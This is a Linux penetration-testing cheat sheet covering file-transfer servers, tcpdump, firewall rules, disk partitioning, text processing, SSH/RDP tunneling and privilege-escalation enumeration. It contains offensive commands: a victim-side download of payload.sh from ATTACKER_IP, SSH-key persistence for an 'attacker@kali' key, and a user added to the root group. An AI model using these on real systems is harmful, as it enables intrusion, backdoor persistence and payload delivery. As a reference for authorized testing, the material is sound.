# Linux Pentest Command Cheat Sheet

A quick reference guide for essential Linux commands used in penetration testing. This covers file transfer servers, packet capture, firewall manipulation, disk partitioning, and remote access.

---

## Web Server & File Transfer

Spin up a quick web server to host payloads or transfer files to a victim machine.

<Tabs>
  <Tab title="Python 3">
    ```bash
    python3 -m http.server 80
    ```
  </Tab>
  <Tab title="Python 2 (Legacy)">
    ```bash
    python -m SimpleHTTPServer 80
    ```
  </Tab>
  <Tab title="PHP">
    ```bash
    php -S 0.0.0.0:8000
    ```
  </Tab>
  <Tab title="Ruby">
    ```bash
    ruby -run -ehttpd . -p8000
    ```
  </Tab>
</Tabs>

<Callout type="tip" title="File Transfer (Victim Side)">
Download files from the attacker's web server using `wget` or `curl`.
```bash
wget http://ATTACKER_IP/payload.sh -O /tmp/payload.sh
curl http://ATTACKER_IP/payload.sh -o /tmp/payload.sh
```
</Callout>

## User & Group Management

Add users, set passwords, and modify group permissions for persistence or privilege escalation.

<AccordionGroup>
  <Accordion title="Local User Management Commands">
    ```bash
    # Change password for a user
    passwd {user}

    # Create a new user with a home directory and bash shell
    useradd -m EDA -s /bin/bash
    passwd EDA 

    # Create a new group
    groupadd EDA

    # Add user to the root group (Dangerous!)
    usermod -aG root EDA

    # Change user UID
    usermod -u 15 EDA
    ```
  </Accordion>
  <Accordion title="SSH Persistence (Adding Keys)">
    ```bash
    # Create .ssh directory on the victim
    mkdir -p ~/.ssh
    chmod 700 ~/.ssh

    # Append your public key to authorized_keys
    echo "ssh-rsa AAAAB3Nza... attacker@kali" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    ```
  </Accordion>
</AccordionGroup>

## Network Sniffing (TCPDump)

Capture network traffic to a file or analyze it in real-time.

```bash
# Show list of available interfaces
tcpdump -D

# Listen on a specific interface
tcpdump -i wlp7s0

# Write captured packets to a file
tcpdump -i wlp7s0 -w file.pcap

# Read a pcap file (without resolving hostnames)
tcpdump -nr file.pcap

# Read a pcap file in ASCII format
tcpdump -nAr file.pcap

# Capture specific UDP traffic (e.g., DNS port 53)
tcpdump -n -i eth0 udp port 53

# Extract unique destination IPs from a pcap file
tcpdump -nr falsimentis.pcap dst host 167.172.201.123 | cut -d ' ' -f 3 | cut -d '.' -f 1-4 | sort -u
```

<Callout type="info" title="Flag Descriptions">
* `-n`: Don't resolve host names or port numbers.
* `-r`: Read from a file.
* `-w`: Write to a file.
* `-A`: Print packets in ASCII.
</Callout>

## Firewall & Routing

Configure Linux kernel firewall rules to allow or drop traffic during pivoting or C2 operations.

<Tabs>
  <Tab title="IPTables (Netfilter)">
    ```bash
    # Insert rule at position 1 to ACCEPT incoming traffic from a specific IP
    iptables -I INPUT 1 -s 172.20.10.5 -j ACCEPT

    # Insert rule at position 1 to ACCEPT outgoing traffic to a specific IP
    iptables -I OUTPUT 1 -d 172.20.10.5 -j ACCEPT

    # Zero the packet and byte counters on all rules
    iptables -Z

    # List all rules with verbose output and byte counters
    iptables -vn -L
    ```
  </Tab>
  <Tab title="UFW (Uncomplicated Firewall)">
    ```bash
    # Allow SSH connections
    ufw allow 22/tcp

    # Allow traffic from a specific IP
    ufw allow from 172.20.10.5

    # Enable the firewall
    ufw enable

    # Check status
    ufw status verbose
    ```
  </Tab>
</Tabs>

## Disk Management & Partitioning

Managing disks and partitions is crucial when setting up a pentest workstation, extracting evidence from acquired drives, or configuring dual-boot systems.

```bash
# List block devices (disks and partitions)
lsblk

# Interactive TUI for partitioning a disk (e.g., /dev/sda)
cfdisk /dev/sda

# Format a partition with ext4 filesystem
mkfs.ext4 /dev/sda1

# Format a partition with NTFS (for Windows compatibility)
mkfs.ntfs -f /dev/sda1

# Mount a partition to a directory
mount /dev/sda1 /mnt/disk

# Unmount a partition
umount /mnt/disk
```

<Callout type="warning" title="cfdisk vs fdisk">
`cfdisk` provides a visual, curses-based interface for managing partitions, making it much easier and safer to use than the purely command-line `fdisk`. Always ensure you are modifying the correct drive (`lsblk` first!) to avoid wiping your OS.
</Callout>

## Text Processing

Parse and transform text in a pipeline or file. Essential for parsing logs or extracting data from tool outputs.

<Tabs>
  <Tab title="Sed (Stream Editor)">
    ```bash
    # Delete lines that start with '1' from a file (-i for in-place editing)
    sed -i '/^1/d' file.txt

    # Remove empty lines from a file
    sed -i '/^$/d' file.txt

    # Replace 'old' with 'new' globally in a file
    sed -i 's/old/new/g' file.txt
    ```
  </Tab>
  <Tab title="Awk (Pattern Scanning)">
    ```bash
    # Print the 3rd column of a space-separated file
    awk '{print $3}' file.txt

    # Print lines where the 1st column matches 'ERROR'
    awk '$1 == "ERROR" {print $0}' logs.txt
    ```
  </Tab>
  <Tab title="Grep & Regex">
    ```bash
    # Extract all IP addresses from a file using regex
    grep -E -o '([0-9]{1,3}\.){3}[0-9]{1,3}' file.txt

    # Find all SUID binaries on the system
    find / -perm -4000 2>/dev/null
    ```
  </Tab>
</Tabs>

## Remote Access & Tunneling

Connecting to remote machines and pivoting traffic through them.

<Tabs>
  <Tab title="RDP (xfreerdp)">
    Connect to a Windows RDP service from a Linux machine.
    ```bash
    # Basic RDP connection
    xfreerdp /v:targetip /u:username /p:password

    # Useful flags:
    # /dynamic-resolution : Allows window resizing
    # +clipboard          : Enables copy/paste between machines
    # /drive:share,/path  : Mounts a local Linux directory into the Windows session
    xfreerdp /v:192.168.1.10 /u:Administrator /p:Password123 /dynamic-resolution +clipboard
    ```
  </Tab>
  <Tab title="SSH Local Port Forward">
    Expose a remote service on your local machine.
    ```bash
    # Forward remote port 80 to local port 8080
    ssh -L 8080:127.0.0.1:80 user@remote_ip -N
    ```
  </Tab>
  <Tab title="SSH Dynamic Port Forward (SOCKS)">
    Create a SOCKS proxy to pivot through the remote machine.
    ```bash
    # Start a SOCKS proxy on local port 9050
    ssh -D 9050 user@remote_ip -N

    # Configure proxychains to use it (/etc/proxychains.conf)
    # socks5 127.0.0.1 9050
    ```
  </Tab>
</Tabs>

## Quick Privilege Escalation Enumeration

Commands to quickly find misconfigurations that could lead to root access.

<CardGroup cols={3}>
  <Card title="SUID Binaries" icon="lock">
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    Look for unusual binaries (e.g., `find`, `python`, `bash`).
  </Card>
  <Card title="Sudo Privileges" icon="shield">
    ```bash
    sudo -l
    ```
    Check if you can run any commands as root without a password.
  </Card>
  <Card title="Cron Jobs" icon="clock">
    ```bash
    cat /etc/crontab
    ls -la /etc/cron.*
    ```
    Look for scripts running as root that are writable by your user.
  </Card>
</CardGroup>
